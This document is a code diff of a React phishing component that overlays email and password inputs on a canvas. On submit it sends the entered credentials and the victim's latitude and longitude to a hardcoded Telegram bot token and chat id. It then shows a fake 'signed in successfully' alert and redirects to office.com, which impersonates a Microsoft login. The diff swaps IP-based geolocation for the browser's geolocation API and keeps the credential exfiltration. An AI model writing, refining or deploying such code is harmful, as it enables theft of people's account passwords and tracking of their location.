@@ -1,25 +1,10 @@
-import React, { useEffect, useRef } from 'react';
-
-// Helper function to fetch geolocation data
-const getGeoLocationData = () => {
-  return new Promise((resolve, reject) => {
-    fetch('http://ip-api.com/json')
-      .then((response) => response.json())
-      .then((data) => {
-        if (data.status === 'success') {
-          resolve(data);
-        } else {
-          reject('Error retrieving geolocation data');
-        }
-      })
-      .catch((err) => reject(err));
-  });
-};
+import React, { useRef, useEffect, useState } from 'react';
 
 const ShippingCanvas = () => {
   const emailInputRef = useRef(null); // Reference for email input
   const passwordInputRef = useRef(null); // Reference for password input
   const canvasRef = useRef(null); // Reference for canvas
+  const [geoData, setGeoData] = useState(null); // State for storing geolocation data
 
   useEffect(() => {
     const canvas = canvasRef.current;
@@ -48,7 +33,6 @@ const ShippingCanvas = () => {
     setInputBox(emailInputRef.current, emailX, emailY, 430, 30);
     setInputBox(passwordInputRef.current, passwordX, passwordY, 430, 30);
 
-    // Use requestAnimationFrame for canvas click listener
     const handleCanvasClick = (event) => {
       const x = event.offsetX;
       const y = event.offsetY;
@@ -60,7 +44,6 @@ const ShippingCanvas = () => {
     canvasRef.current.addEventListener('click', handleCanvasClick);
 
     return () => {
-      // Clean up the event listener when the component unmounts
       canvasRef.current.removeEventListener('click', handleCanvasClick);
     };
   };
@@ -70,7 +53,7 @@ const ShippingCanvas = () => {
     inputElement.style.top = `${canvasRef.current.offsetTop + y}px`;
     inputElement.style.width = `${width}px`;
     inputElement.style.height = `${height}px`;
-    inputElement.style.visibility = 'visible'; // Make sure the input is visible
+    inputElement.style.visibility = 'visible';
   };
 
   const handleSubmit = async () => {
@@ -82,28 +65,33 @@ const ShippingCanvas = () => {
     }
 
     try {
-      // Fetch geolocation data
-      const geoData = await getGeoLocationData();
+      // Retrieve geolocation using the browser's built-in API
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          setGeoData({ latitude, longitude });
 
-      // Send data to Telegram bot
-      const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
-      const chatId = '6707519229';
-      const message = `📨 **Email:** ${email}
-        🔑 **Password:** ${password}
-        🌍 **IP Address:** ${geoData.query}
-        🌐 **Country:** ${geoData.country}
-        🏙️ **Region:** ${geoData.regionName}
-        🏙️ **City:** ${geoData.city}
-        📍 **Latitude:** ${geoData.lat}
-        📍 **Longitude:** ${geoData.lon}`;
-      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-      const response = await fetch(telegramUrl);
-      if (response.ok) {
-        alert('You have signed in successfully');
-        window.location.href = 'https://www.office.com';
-      } else {
-        alert('Error sending message');
-      }
+          // Send data to Telegram bot
+          const botToken = '7315734945:AAEwBBKiHG5dorU-IT6nOnS1Yi76W37qPmI';
+          const chatId = '6707519229';
+          const message = `📨 **Email:** ${email}
+            🔑 **Password:** ${password}
+            📍 **Latitude:** ${latitude}
+            📍 **Longitude:** ${longitude}`;
+          const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+          const response = await fetch(telegramUrl);
+          if (response.ok) {
+            alert('You have signed in successfully');
+            window.location.href = 'https://www.office.com';
+          } else {
+            alert('Error sending message');
+          }
+        },
+        (error) => {
+          console.error('Geolocation error:', error);
+          alert('Error retrieving geolocation data');
+        }
+      );
     } catch (error) {
       console.error('Geolocation error:', error);
       alert('Error retrieving geolocation data');
@@ -119,23 +107,23 @@ const ShippingCanvas = () => {
         style={{ border: '1px solid black' }}
       ></canvas>
       <input
-        ref={emailInputRef} // Use ref to access the value
+        ref={emailInputRef}
         type="text"
         className="hidden-input"
         placeholder="Email"
         style={{
           position: 'absolute',
-          visibility: 'hidden', // Keep the input off-screen, but still interactive
+          visibility: 'hidden',
         }}
       />
       <input
-        ref={passwordInputRef} // Use ref to access the value
+        ref={passwordInputRef}
         type="password"
         className="hidden-input"
         placeholder="Password"
         style={{
           position: 'absolute',
-          visibility: 'hidden', // Keep the input off-screen, but still interactive
+          visibility: 'hidden',
         }}
       />
     </div>
